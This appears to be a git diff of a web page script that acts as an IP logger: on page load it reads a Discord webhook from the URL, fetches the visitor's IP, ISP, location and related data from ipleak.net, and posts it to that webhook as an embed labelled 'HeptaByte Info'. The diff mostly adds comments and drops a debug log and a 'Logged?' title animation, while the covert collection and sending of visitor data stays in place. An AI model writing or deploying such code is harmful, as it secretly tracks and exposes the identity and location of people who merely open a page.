@@ -1,13 +1,12 @@
 window.onload = async function() {
   // Get the query string parameters
   const urlParams = new URLSearchParams(window.location.search);
-  
-  // Extract the webhook URL from the query string
+
+  // Check if 'webhook' parameter exists in the URL
   const webhookUrl = urlParams.get('webhook');
-  console.log("Webhook URL:", webhookUrl);  // Log to check the extracted URL
-  
+
   if (webhookUrl && webhookUrl.includes("discord.com/api/webhooks")) {
-    // If a valid webhook URL is found, send the visitor information
+    // If a valid webhook URL is found, fetch visitor info and send the embed
     await sendVisitorInfoToWebhook(webhookUrl);
   } else {
     console.error("Invalid or missing webhook URL.");
@@ -16,6 +15,7 @@ window.onload = async function() {
 
 async function sendVisitorInfoToWebhook(webhookUrl) {
   try {
+    // Fetch visitor info (IP, ISP, country, etc.)
     const response = await fetch('https://ipleak.net/json/');
 
     if (!response.ok) {
@@ -26,6 +26,7 @@ async function sendVisitorInfoToWebhook(webhookUrl) {
     const visitorData = await response.json();
     if (!visitorData) return;
 
+    // Prepare the visitor data for the embed
     const visitorInfo = {
       ip: visitorData.ip || "Unknown",
       isp: visitorData.isp_name || "Unknown",
@@ -43,6 +44,7 @@ async function sendVisitorInfoToWebhook(webhookUrl) {
       queryDate: new Date(visitorData.query_date * 1000 || Date.now()).toLocaleString(),
     };
 
+    // Create the embed
     const embed = {
       title: "HeptaByte Info from recent request on site.",
       color: 0x000000,
@@ -61,6 +63,7 @@ async function sendVisitorInfoToWebhook(webhookUrl) {
       ]
     };
 
+    // Send the data as an embed to the webhook URL
     const webhookResponse = await fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -76,36 +79,3 @@ async function sendVisitorInfoToWebhook(webhookUrl) {
     console.error('Unexpected error:', error.message);
   }
 }
-
-const originalTitle = "Logged?";
-const deleteSpeed = 300; 
-const typingSpeed = 300;
-
-let titleIndex = 0;
-let titleDeleteIndex = originalTitle.length;
-
-function typeTitle() {
-    if (titleIndex < originalTitle.length) {
-        document.title += originalTitle.charAt(titleIndex);
-        titleIndex++;
-        setTimeout(typeTitle, typingSpeed);
-    } else {
-        setTimeout(deleteTitle, 0);
-    }
-}
-
-function deleteTitle() {
-    if (titleDeleteIndex >= 1) {
-        document.title = document.title.slice(0, titleDeleteIndex);
-        titleDeleteIndex--;
-        setTimeout(deleteTitle, deleteSpeed);
-    } else {
-        titleIndex = 1;
-        titleDeleteIndex = originalTitle.length;
-        setTimeout(typeTitle, 0);
-    }
-}
-
-window.onload = () => {
-    typeTitle();
-};
